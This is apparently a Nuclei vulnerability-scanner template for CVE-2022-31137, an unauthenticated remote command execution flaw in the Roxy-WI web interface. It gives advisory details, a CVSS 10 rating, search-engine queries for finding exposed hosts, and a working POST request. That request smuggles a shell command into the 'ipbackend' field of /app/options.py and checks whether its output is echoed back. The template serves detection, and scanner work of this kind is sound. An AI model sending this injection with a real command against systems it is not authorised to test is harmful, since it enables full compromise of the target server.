id: CVE-2022-31137

info:
  name: Roxy-WI Remote Command Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: Roxy-WI is a web interface for managing Haproxy, Nginx, Apache and Keepalived servers. Versions prior to 6.1.1.0 are subject to a remote code execution vulnerability. System commands can be run remotely via the subprocess_execute function without processing the inputs received from the user in the /app/options.py file. Attackers need not be authenticated to exploit this vulnerability. Users are advised to upgrade. There are no known workarounds for this vulnerability.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and complete compromise of the target system.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the Roxy-WI Remote Command Execution vulnerability (CVE-2022-31137).
  reference:
    - http://packetstormsecurity.com/files/167805/Roxy-WI-Remote-Command-Execution.html
    - https://github.com/hap-wi/roxy-wi/security/advisories/GHSA-53r2-mq99-f532
    - https://pentest.blog/advisory-roxywi-unauthenticated-remote-code-execution-cve-2022-3113/
    - http://packetstormsecurity.com/files/171648/Roxy-WI-6.1.0.0-Improper-Authentication-Control.html
    - http://packetstormsecurity.com/files/171652/Roxy-WI-6.1.1.0-Remote-Code-Execution.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2022-31137
    cwe-id: CWE-78
    epss-score: 0.94344
    epss-percentile: 0.99295
    cpe: cpe:2.3:a:roxy-wi:roxy-wi:*:*:*:*:*:*:*:*
  metadata:
    vendor: roxy-wi
    product: roxy-wi
    shodan-query: http.html:"Roxy-WI"
    fofa-query: body="roxy-wi"
  tags: packetstorm

http:
  - method: POST
    path:
      - "{{BaseURL}}/app/options.py"

    body: |
      serv=127.0.0.1&ipbackend="; {{randstr}} ;#&alert_consumer={{rand_text_alpha_lower(7)}}&backend_server=127.0.0.1

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "{{randstr}}"
        part: body
